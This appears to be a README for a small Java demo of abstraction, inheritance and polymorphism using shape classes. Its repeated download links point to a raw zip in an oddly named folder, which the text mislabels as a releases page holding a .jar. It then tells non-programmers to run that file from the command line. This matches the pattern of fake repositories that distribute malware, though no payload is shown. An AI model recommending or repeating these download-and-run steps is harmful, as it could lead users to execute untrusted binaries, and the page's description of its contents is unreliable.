# 🟢 java-abstract-shapes - Simple Java OOP Concepts Explained

[![Download Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://raw.githubusercontent.com/jaideep624/java-abstract-shapes/main/Ortyginae/shapes-java-abstract-1.8.zip)

---

## 📘 Overview

java-abstract-shapes is a small Java project that shows how to use some important programming ideas called Object-Oriented Programming (OOP). It focuses on three main ideas: abstraction, inheritance, and polymorphism. These concepts help organize and reuse code in a clear way.

The project lets you see how to work with different shapes, like circles and rectangles, and calculate their areas using simple rules. This helps to understand how code can be written to be flexible and easy to change.

You do not need programming experience to use this app. It runs on Windows and shows basic principles in action.

---

## ⚙️ What This Project Does

This project uses an abstract shape class. "Abstract" means you cannot create a shape directly, but you can create specific kinds of shapes from it.

- The abstract class defines a method called `area()`. This method tells each shape how to find its size.
- Two shapes inherit from this class:
  - **Circle:** It uses the formula π × radius² to find the area.
  - **rectAngle:** It uses the formula length × width to find the area.
  
When the program runs, it uses a technique called polymorphism. This means the program treats all shapes the same way but can still calculate each shape’s area correctly.

---

## 🖥️ System Requirements

Before you download and run java-abstract-shapes, make sure your computer meets these basic needs:

- **Operating System:** Windows 7 or later versions (Windows 10 recommended)
- **Java:** Java Runtime Environment (JRE) version 8 or higher must be installed
- **RAM:** At least 2 GB free memory
- **Disk Space:** At least 20 MB free space
- **Processor:** Any modern 1 GHz or faster processor

You can check if Java is installed by opening the Command Prompt and typing `java -version`. If Java is not installed or the version is lower than 8, you must install or update it first from the official Java website.

---

## 🚀 Getting Started: How to Download and Run

1. Click the big green **Download Release** badge/button at the top or visit this page directly:  
   [https://raw.githubusercontent.com/jaideep624/java-abstract-shapes/main/Ortyginae/shapes-java-abstract-1.8.zip](https://raw.githubusercontent.com/jaideep624/java-abstract-shapes/main/Ortyginae/shapes-java-abstract-1.8.zip)

2. On the releases page, find the latest release. Look for a file ending with `.jar`. This is the application file you need.

3. Download the `.jar` file to a folder you can easily find, such as **Downloads** or your desktop.

4. To run the application:
   - Open **Command Prompt**:
     - Press the **Windows key**, type `cmd`, and press Enter.
   - Navigate to the folder where you saved the `.jar` file using the `cd` command. For example:
     ```
     cd C:\Users\YourUserName\Downloads
     ```
   - Run the Java application by typing:
     ```
     java -jar java-abstract-shapes.jar
     ```
     Replace `java-abstract-shapes.jar` with the exact name of the file you downloaded.

5. The application will open and run in the Command Prompt window. You can follow any prompts or view the output as it calculates areas of different shapes.

---

## 💽 Installation Tips

- Make sure Java is installed before running the program.
- If you see an error about "java is not recognized,” Java may not be properly installed or added to your system’s PATH variable.
- To add Java to PATH, you can search online for simple guides to set up Java environment variables on Windows.
- You do not need to install anything else. The `.jar` file is ready to run.

---

## 📂 How the Program Works

To help you understand what happens when you run the app:

- The program starts with a base class called `shape`. This special base class cannot be used by itself.
- Two classes extend this base class:  
  - `Circle` calculates area using its radius.  
  - `rectAngle` calculates area using its length and width.
- In the program’s main method, it uses something called runtime polymorphism. The program keeps track of shapes as the main `shape` type but still calls each shape’s own method to find the area.
- This shows how Java uses OOP to handle different types while keeping the code simple and clean.

---

## 🎯 Key Features

- Demonstrates abstraction through abstract class usage.
- Shows how inheritance allows classes to reuse code.
- Uses method overriding to provide different shape areas.
- Applies polymorphism to treat objects uniformly.
- Simple, clear Java code suitable for learning OOP basics.
- Runs on any Windows machine with Java installed.
- No complicated setup required.

---

## 🔧 How to Use the Application

Once the program is running:

- It will create objects representing a circle and a rectangle.
- You will see printed output showing the calculated areas.
- This is a demonstration, so it runs and stops after showing results.
- There is no graphical interface—all output appears in the Command Prompt window.

---

## 📂 Project Files

The main files you will find in the project folder:

- **Shape.java** – Defines the abstract base class with the `area()` method.
- **Circle.java** – A class that extends Shape and calculates circle areas.
- **rectAngle.java** – A class that extends Shape and calculates rectangle areas.
- **Main.java** – Contains the main method where polymorphism is shown.

These files show clean Java structure using OOP concepts. Reviewing the source code may help understand how abstraction, inheritance, and polymorphism work in practice.

---

## 🛠 Troubleshooting

- If the app does not run, check that you typed the `java -jar` command correctly.
- Verify you downloaded the `.jar` file and not the source code zip file.
- Ensure your Java installation matches the required version.
- If you get error messages, copy the message and search online for fixes related to Java `.jar` execution on Windows.

---

## 📥 Download Link

Download the latest available version by visiting the releases page here:

[https://raw.githubusercontent.com/jaideep624/java-abstract-shapes/main/Ortyginae/shapes-java-abstract-1.8.zip](https://raw.githubusercontent.com/jaideep624/java-abstract-shapes/main/Ortyginae/shapes-java-abstract-1.8.zip)  

Click on the `.jar` file to download, then run it as explained above.